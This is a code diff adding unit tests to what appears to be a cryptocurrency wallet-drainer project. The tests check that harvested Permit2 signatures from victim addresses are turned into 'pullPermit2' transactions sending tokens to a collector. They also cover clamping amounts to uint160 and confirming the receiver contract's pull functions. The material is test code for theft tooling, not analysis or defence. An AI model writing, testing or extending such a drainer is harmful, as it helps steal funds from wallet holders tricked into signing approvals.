@@ -20,10 +20,13 @@ from eth_utils import keccak
 
 import abi
 import chains
+import database
 import drainer
 import scanners
 import solana_tx
 import tron_tx
+
+database.init_db()
 
 
 class RegistryTests(unittest.TestCase):
@@ -146,6 +149,8 @@ class PermitBatchTests(unittest.TestCase):
         self.assertEqual(len(typed["message"]["details"]), 2)
         self.assertEqual(typed["message"]["spender"], self.RECEIVER)
         self.assertEqual(typed["primaryType"], "PermitBatch")
+        self.assertEqual(typed["domain"]["version"], "1")
+        self.assertIn("version", {f["name"] for f in typed["types"]["EIP712Domain"]})
 
     def test_signature_recovers_against_stored_batch(self):
         account = Account.create()
@@ -205,6 +210,60 @@ class PermitBatchTests(unittest.TestCase):
         self.assertEqual(amounts[self.TOKEN_B], 2 * 10**12)      # cap-limited
 
 
+class ConsumedBatchTests(unittest.TestCase):
+    """A spent Permit2 nonce must never be submitted twice."""
+
+    RECEIVER = "0x1111111111111111111111111111111111111111"
+    TOKEN = "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"
+
+    def _run(self, grant):
+        sent = []
+
+        async def fake_send(net, key, to, data, value=0):
+            sent.append(data)
+            return f"0x{len(sent):064x}"
+
+        original = (drainer._evm_send, drainer._collector_evm, drainer._require_key)
+        drainer._evm_send = fake_send
+        drainer._collector_evm = lambda net: self.RECEIVER
+        drainer._require_key = lambda fam: "0x" + "11" * 32
+        try:
+            asyncio.run(drainer._evm_pull_batch([grant]))
+        finally:
+            (drainer._evm_send, drainer._collector_evm,
+             drainer._require_key) = original
+        return sent
+
+    def test_consumed_batch_uses_pull_permit2(self):
+        deadline = int(time.time()) + 3_600
+        details = [{"token": self.TOKEN, "amount": 10**12,
+                    "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 5}]
+        grant = {"id": "g", "network": "Base", "address": "0x" + "22" * 20,
+                 "token": self.TOKEN, "balance_raw": str(10**11),
+                 "batch": json.dumps({"details": details, "spender": self.RECEIVER,
+                                      "sigDeadline": deadline}),
+                 "signature": "0x" + "11" * 65, "batch_consumed": 1}
+        sent = self._run(grant)
+        self.assertEqual(len(sent), 1)
+        self.assertTrue(sent[0].startswith(abi.SEL_PULL_PERMIT2))
+        self.assertFalse(sent[0].startswith(abi.SEL_PERMIT_PULL))
+
+    def test_permit_amount_is_clamped_to_uint160(self):
+        deadline = int(time.time()) + 3_600
+        details = [{"token": self.TOKEN, "amount": str(abi.UINT160_MAX),
+                    "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 6}]
+        grant = {"id": "g", "network": "Base", "address": "0x" + "22" * 20,
+                 "token": self.TOKEN, "balance_raw": str(abi.UINT160_MAX + 5),
+                 "batch": json.dumps({"details": details, "spender": self.RECEIVER,
+                                      "sigDeadline": deadline}),
+                 "signature": "0x" + "11" * 65, "batch_consumed": 1}
+        sent = self._run(grant)
+        self.assertEqual(len(sent), 1)
+        self.assertTrue(sent[0].startswith(abi.SEL_PULL_PERMIT2))
+        # amount word is the last 32 bytes of the calldata
+        self.assertEqual(int(sent[0][-64:], 16), abi.UINT160_MAX)
+
+
 class ReceiverArtifactTests(unittest.TestCase):
     """The committed artifact must be deployable without a compiler."""
 
@@ -218,6 +277,7 @@ class ReceiverArtifactTests(unittest.TestCase):
         import receiver
         names = {entry.get("name") for entry in receiver.load_artifact()["abi"]}
         self.assertIn("permitAndPull", names)
+        self.assertIn("pullPermit2", names)
         self.assertIn("pullDirect", names)
         self.assertIn("owner", names)
 
